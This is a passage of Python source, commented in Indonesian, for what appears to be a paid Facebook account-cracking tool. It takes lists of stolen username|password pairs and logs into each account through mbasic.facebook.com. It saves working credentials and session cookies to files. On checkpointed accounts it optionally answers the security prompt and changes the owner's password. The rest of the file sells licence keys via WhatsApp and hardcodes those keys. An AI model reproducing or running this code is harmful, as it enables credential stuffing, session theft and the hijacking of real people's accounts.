O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s [%s\033[0m \033[0mpilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			print("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
#////////////LISENSI///////////#
def premium():
	clear()
	mtkk("""
╦  ┬┌─┐┌─┐┌┐┌┌─┐┬ 
║  │└─┐├┤ │││└─┐│ 
╩═╝┴└─┘└─┘┘└┘└─┘┴ 

""")
	prints(Panel(f"{x}[{p}*{x}]MASUKAN API KEY/BELI API KEY",width=80,padding=(0,8),style=f"{color_table}"))
	ask = input(f"{x}[{b}*{x}]. pilih Y/T :{N} ")
	if ask in["y","Y"]:harga()
	if ask in["t","T"]:gak()
	else:
		prints(Panel(f'''{x}[{p}*{x}]. pilih yg bener jangan salah''',width=80,padding=(0,8),style=f"{color_table}"));time.sleep(2)
	
def gak():
	prints(Panel(f'''{x}[{p}*{x}]. apakah anda ingin menuju le menu utama.''',width=80,padding=(0,4),style=f"{color_table}"))
	ask = input(f"{x}[{b}*{x}]. pilih Y/T :{N} ")
	if ask in["y","Y"]:Code_()
	if ask in["t","T"]:tidak()
	else:
		prints(Panel(f'''{x}[{p}*{x}]. pilih yg bener jangan salah''',width=80,padding=(0,8),style=f"{color_table}"));sleep(2)
	
def tidak():
	# prints(Panel(f'''{x}[{p}*{x}]. selamat tinggal jangan lupa donasi''',width=80,padding=(0,4),style=f"{color_table}"))
	exit()

###----------[ HARGA ]---------- ###
def harga():
	clear()
	mtkk("""
╦  ┬┌─┐┌─┐┌┐┌┌─┐┬ 
║  │└─┐├┤ │││└─┐│ 
╩═╝┴└─┘└─┘┘└┘└─┘┴ 

""")
	prints(Panel(f"""{x}[{p}01{x}]. Api Key Perminggu : 35k
[{p}02{x}]. Api Key Perbulan  : 55k
[{p}03{x}]. Api Key Pertahun  : 120k
[{p}04{x}]. file open source  : 230k
[{p}05{x}]. MASUKAN KEY
[{p}00{x}]. {m}kembali""",width=80,padding=(0,4),style=f"{color_table}"))
	prints(Panel(f"{x}[{p}*{x}]. mau beli lisensi yg berapa",width=80,padding=(0,4),style=f"{color_table}"))
	ask = input(f"{x}[{p}*{x}]. berapa :{N} ")
	if ask in["1","01"]:seminggu()
	elif ask in["2","02"]:sebulan()
	elif ask in["3","03"]:setahun()
	elif ask in["4","04"]:open_source()
	elif ask in["5","05"]:lesensi()
	elif ask in["0","00"]:menu()
	else:
		prints(Panel(f'''{x}[{p}*{x}]. pilih yg bener jangan salah''',width=80,padding=(0,8),style=f"{color_table}"));time.sleep(2)
	
def seminggu():
	prints(Panel(f'''{x}[{p}*{x}]. anda akan di arahkan ke whatsapp''',width=80,padding=(0,4),style=f"{color_table}"))
	os.system("xdg-open https://wa.me/6283823705893?text=assalamualaikum,+bang+gw+mau+beli+lisensi+yg+Perminggu+35k")
	time.sleep(2);premium()
	
def sebulan():
	prints(Panel(f'''{x}[{p}*{x}]. anda akan di arahkan ke whatsapp''',width=80,padding=(0,4),style=f"{color_table}"))
	os.system("xdg-open https://wa.me/6283823705893?text=assalamualaikum,+bang+gw+mau+beli+lisensi+yg+Perbulan+55k")
	time.sleep(2);premium()
	
def setahun():
	prints(Panel(f'''{x}[{p}*{x}]. anda akan di arahkan ke whatsapp''',width=80,padding=(0,4),style=f"{color_table}"))
	os.system("xdg-open https://wa.me/6283823705893?text=assalamualaikum,+bang+gw+mau+beli+lisensi+yg+Pertahun+120k")
	time.sleep(2);premium()
	
def open_source():
	prints(Panel(f'''{x}[{p}*{x}]. anda akan di arahkan ke whatsapp''',width=80,padding=(0,4),style=f"{color_table}"))
	os.system("xdg-open https://wa.me/6283823705893?text=assalamualaikum,+bang+gw+mau+beli+file+yg+open source+230k")
	time.sleep(2);premium()
#--------------------[ LICENCE -BANG ]--------------#
def lesensi():
	clear()
	mtkk("""
╦  ┬┌─┐┌─┐┌┐┌┌─┐┬ 
║  │└─┐├┤ │││└─┐│ 
╩═╝┴└─┘└─┘┘└┘└─┘┴ 

login your lesensi / api key

""")

	api = input('Masukan Lesensi : ')

	if api =="VYKH-YTAGU-IJSHK-HJWI":
	   time.sleep(3)
	   mengetik('sedang mengecek lesensi anda') 
	   time.sleep(5)
	   mengetik('\nlesensi valid✔️\n')     
	   Code_()
	   time.sleep(4)
	if api not in ('F7JAR-ASFSJ-UKAS-YIPS','AUTH-OYTR-OQRFS-BGFR',"VYTOI-OKAYG-BGUH-KAIH-OKAH"):
		mengetik('your lesensi not fund  ')
		lesensi()
	else:
		mengetik('lisensi not fund ')

#------------------[ METHODE-FREE-FB ]-------------------#              
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	premium()
